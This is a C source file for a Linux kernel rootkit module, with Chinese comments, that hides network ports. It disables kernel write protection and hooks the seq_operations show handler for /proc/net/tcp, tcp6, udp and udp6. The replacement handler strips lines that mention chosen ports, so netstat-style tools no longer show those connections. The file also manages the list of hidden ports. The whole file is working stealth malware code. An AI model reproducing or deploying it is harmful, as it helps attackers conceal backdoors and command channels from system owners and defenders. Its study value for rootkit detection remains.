#include "hideport.h"

#define TCP_ENTRY "/proc/net/tcp"
#define TCP6_ENTRY "/proc/net/tcp6"
#define UDP_ENTRY "/proc/net/udp"
#define UDP6_ENTRY "/proc/net/udp6"
#define NEEDLE_LEN 6

struct ports_struct
{
    struct list_head next;
    int port;
};

// 链表
LIST_HEAD(port_list);

int hideports_num = 0;

#define set_afinfo_seq_op(opname, path, new, old)                    \
    do                                                               \
    {                                                                \
        struct file *filp;                                           \
        struct seq_file *seq;                                        \
        struct seq_operations *seq_op;                               \
        pr_info("Opening the path: %s.\n", path);                    \
        filp = filp_open(path, O_RDONLY, 0);                         \
        if (IS_ERR(filp))                                            \
        {                                                            \
            pr_info("Failed to open %s with error %ld.\n",           \
                    path, PTR_ERR(filp));                            \
            old = NULL;                                              \
        }                                                            \
        else                                                         \
        {                                                            \
            pr_info("Succeeded in opening: %s\n", path);             \
            seq = (struct seq_file *)filp->private_data;             \
            seq_op = (struct seq_operations *)seq->op;               \
            old = seq_op->opname;                                    \
                                                                     \
            pr_info("Changing seq_op->" #opname " from %p to %p.\n", \
                    old, new);                                       \
            disable_write_protection();                              \
            seq_op->opname = new;                                    \
            enable_write_protection();                               \
        }                                                            \
    } while (0)

// 函数指针，用于存储原有的操作对应的函数
int (*real_seq_show)(struct seq_file *seq, void *v);
int fake_seq_show(struct seq_file *seq, void *v);

int init_hideport(void)
{
    set_afinfo_seq_op(show, TCP_ENTRY, fake_seq_show, real_seq_show);
    set_afinfo_seq_op(show, TCP6_ENTRY, fake_seq_show, real_seq_show);
    set_afinfo_seq_op(show, UDP_ENTRY, fake_seq_show, real_seq_show);
    set_afinfo_seq_op(show, UDP6_ENTRY, fake_seq_show, real_seq_show);

    return 1;
}

void cleanup_hideport(void)
{
    if (real_seq_show)
    {
        void *dummy;
        set_afinfo_seq_op(show, TCP_ENTRY, real_seq_show, dummy);
        set_afinfo_seq_op(show, TCP6_ENTRY, real_seq_show, dummy);
        set_afinfo_seq_op(show, UDP_ENTRY, real_seq_show, dummy);
        set_afinfo_seq_op(show, UDP6_ENTRY, real_seq_show, dummy);
    }

    pr_info("Cleanup Hideport\n");
}

int fake_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    int i;
    size_t last_count, last_size;
    struct list_head * pos;
    struct ports_struct *entry;

    last_count = seq->count;
    ret = real_seq_show(seq, v);
    last_size = seq->count - last_count;

    if (hideports_num > 0)
    {
        // 遍历链表
        list_for_each(pos, &port_list)
        {
            entry = list_entry(pos, struct ports_struct, next);
            char needle[NEEDLE_LEN];
            snprintf(needle, NEEDLE_LEN, ":%04X", entry->port);
            if (strnstr(seq->buf + seq->count - last_size, needle, last_size))
            {
                pr_info("Hiding port %d using needle %s.\n",
                        entry->port, needle);
                seq->count -= last_size;
            }
        }
    }
    return ret;
}

void add_hideport(int port)
{
    struct list_head * pos;
    struct ports_struct *entry, *temp;
    if (hideports_num > 0)
    {
        list_for_each(pos, &port_list)
        {
            entry = list_entry(pos, struct ports_struct, next);
            if (port == entry->port)
            {
                pr_info("Port has been hidden\n");
                return;
            }
        }
    }
    temp = kmalloc(sizeof(struct ports_struct), GFP_KERNEL);
    if (temp == NULL)
    {
        pr_info("Kmalloc fail\n");
        return;
    }
    temp->port = port;
    // 插入结点
    list_add(&temp->next, &port_list);
    hideports_num++;
    pr_info("Port %d is hidden\n", port);
}

void delete_hideport(int port)
{
    struct list_head * pos;
    struct ports_struct *entry;
    if (hideports_num > 0)
    {
        list_for_each(pos, &port_list)
        {
            entry = list_entry(pos, struct ports_struct, next);
            if (port == entry->port)
            {
                // 删除结点
                list_del(&entry->next);
                memset(entry, 0, sizeof(struct ports_struct));
                kfree(entry);
                entry = NULL;
                hideports_num--;
                pr_info("Port %d is unhidden\n", port);
                return;
            }
        }
        pr_info("Port %d maybe not be hidden\n", port);
    }
    else
    {
        pr_info("No port was hidden\n");
    }
}
